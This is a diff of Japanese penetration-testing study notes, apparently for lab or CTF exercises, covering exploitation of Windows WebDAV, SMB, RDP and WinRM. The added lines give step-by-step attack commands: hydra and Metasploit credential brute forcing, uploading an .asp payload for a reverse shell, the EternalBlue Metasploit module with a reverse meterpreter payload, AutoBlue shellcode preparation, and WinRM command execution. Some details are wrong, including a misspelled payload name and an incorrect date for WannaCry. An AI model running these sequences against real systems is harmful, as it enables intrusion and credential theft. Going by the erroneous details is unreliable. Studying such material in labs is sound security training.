@@ -18,13 +18,40 @@ windowsの脆弱性の悪用
 4) 権限昇格：初期侵入後に攻撃者がより高い権限を取得できてしまう脆弱性
 5) サービス拒否：攻撃者がシステムのリソースを枯渇させ、正常な動作を妨げる脆弱性
 
-Metasploitを使用したwebdavのエクスプロイト
-demo
+webdavの悪用
+・IISは、マイクロソフトによって開発されたwindowsNTファミリ向けの独自の拡張可能なウェブサーバーソフトウェア
+・Webサイトやウェブアプリケーションのホスティングに使用でき、管理者に対してwebサイト管理用の強力なGUIを提供する。
+・IISは、ASP.NETやPHPで開発された静的・動的なwebページの両方をホストするために使用できる
+・ポートは、80or443で動作するように構成する
+・対応している実行可能なファイルの拡張子は、.asp、aspx、.config、.php
+
+・webdavは、HTTPプロトコルの拡張機能のセットであり、ユーザーがリモートウェブサーバー上のファイルを共同で編集および管理できるようにする。
+・webdavは、webサーバーを共同編集用のファイルサーバーとして機能させることが可能
+・webdavは、microsoftIIS上で動作し、通常、80および443を使用する。
+・webdavは、ユーザ名とパスコードが必要
+
+・webdavへの悪用
+1) IIS上でwebdavを動いていることを確認する
+2) webdavに対して、ブルートフォース攻撃を行い、認証に使える認証を取得
+3) webdavにログインして、悪意のある.aspペイロードをアップロードし、任意コマンドを実行してターゲット上でリバースシェルを取得する。
+
+・webdavで使用できるツールは、davtestやcadaverがある。
+
+demo webdavへのexploit
+1) ポートスキャン
+nmap -sC -sV target-ip
+2) webdavがwindowsIIS上で動いているかを確認する
+nmap -sV -p 80 --script=http-enum targetip
+3) 以下のコマンドでブルートフォースを実行
+hydra -L wordlist -P password directory targetIP http-get /webdav/
+
+・webdavでは、検索ボックスで、dirで調べて、type C:\flagで中身を見る。
+
 
 PsExecを使ったSMBのエクスプロイト
 ・SMB(Server Message Block)は、ローカルネットワーク上のコンピュータ間でファイルや周辺機器を共有するために使用されるネットワーク共有プロトコル
 →SMBはポート445
-・SAMBAは、SMBのオープンソース実装で、WindowsシステムがLinuxの共有やデバイスにアクセスできるようにする。
+・SAMBAは、Linux上のオープンソース実装で、WindowsシステムがLinuxの共有やデバイスにアクセスできるようにする。
 
 ・SMBプロトコルでは、2段階で認証を行う
 1) ユーザー認証：ユーザーは共有にアクセスするために、SMBサーバーへ認証するときにユーザー名とパスコードを提供する必要がある
@@ -40,15 +67,50 @@ PsExecを使ったSMBのエクスプロイト
 ・ブルートフォースの対象は、一般的なwindowsユーザアカウントのみに絞る
 ・資格情報を得た後、それを使ってPsExec経由でターゲットに認証し、任意のシステムコマンドを実行したりリバースシェルを取得したりすることが可能。
 
-windows ms17-010 smb脆弱性
-demo
+windows ms17-010 smb脆弱性（eternal blue)
+・Eternalblueは、Windowsの一連の脆弱性とそれを突くエクスプロイトにつけられた名称でこれにより攻撃者は任意コードをリモート実行してWindowsシステムへ侵入して結果的にそのシステムに属するネットワークにもアクセスを広げることができる。
+・Eternalblueは、NSAによってMS17-010の脆弱性を悪用する手法として作られ、2017年にshodow brokersによって流失した
+・このエクスプロイトは、smbv1プロトコルの脆弱性をつき、攻撃者が特殊に細工したパケットを送ることで任意のコマンド実行を可能にするもの
 
-RDP exploit
+・eternalblueエクスプロイトは、2017年6/27に発生したWannacryランサムウェア攻撃で使用され、windowsシステムを次々と感染させ、多くのシステムに拡大した
+
+・metasploitでは、検出用のauxiliaryと攻撃用のexploitモジュールが用意されている。
+・攻撃に成功すると、特権付きmeterpreterセッションを得ることが多いので、横展開に有効
+
+demo eternalblueのexploit
+1) nmap -p 445 --script=smb-vuln-ms17-010 targetIP
+2) msfconsole 
+3) use exploit/windows/smb/ms17_010_eternalblue
+4) RHOSTでターゲットIPとLHOSTで自分のIPを設定
+5) set PAYLOAD windows/x64/meterpreter/reverse_top
+6) set LPORT 4444
+7) exploit
+
+
+
+1) githubからのclone(autoblue-ms17-010)
+2) cd shellcode
+3) chmod +x shell_prep.sh
+4) ./shell_prep.sh
+5) y
+6) LHOST for reverse connectionでmy ipを設定
+7) LPORTでx64リッスンするポートの設定
+8) LPORTでx86リッスンするポートの設定
+9) regular cmd shellを選択
+10) stagelessのペイロードを設定
+11) ls -alで自分の悪用を確認する
+
+
+RDP(remote desktop protocol) exploit
 ・RDPは、Microsoftが開発した独自のGUIリモートアクセスプロトコルで、windowsシステムにリモート接続して操作するために使用される
 ・RDPはデフォで、3389を使用するが、設定で変更可能
 ・RDPの認証には、ターゲットシステム上の正当なユーザアカウントと、そのユーザーのパスコードが必要
 ・RDPに対してブルートフォースを行うことで、ユーザーの認証情報を得れる。
 
+・xfreerdpを使用して、RDP経由でウィンドウズターゲットにリモートアクセスするには、以下のコマンドを使用する。
+xfreerdp /u:管理者 /p：パスワード /v:ターゲットIP：ポート番号
+
+cve-2019-0708-bluekeep
 demo
 1) 
 
@@ -64,6 +126,27 @@ winRM exploit
 ・winrmは、さまざまな認証方式を通じてシステム間の通信に対するアクセス制御とセキュリティを実装
 ・「crackmapexec」というユーティリティを使ってwinrmに対してブルートフォースを実行し、ユーザ名とパスコードを特定し、ターゲット上で実行する
 ・rubyスクリプトの「evil-winrm」を利用して、ターゲットシステム上でコマンドシェルセッションを取得できる
+
+demo winrm:msfによるエクスプロイト
+1) nmap --top-ports 7000 target domain
+2) msfconsole
+3) 基本情報の設定
+set RHOSTS target
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+set PASSWORD anything
+exploit
+4) 以下のコマンドで認証方法を確認する
+use /auxiliary/scanner/winrm/winrm_auth_methods
+set RHOSTS target
+exploit
+5) winrm_cmdと3)で得た認証情報を使って悪用する
+6) winrm_script_execエクスプロイトモジュールを使用して、meterpreterを取得
+7) cd /
+8) dir
+9) cat flag.txt
+
 
 
 windowsの権限昇格
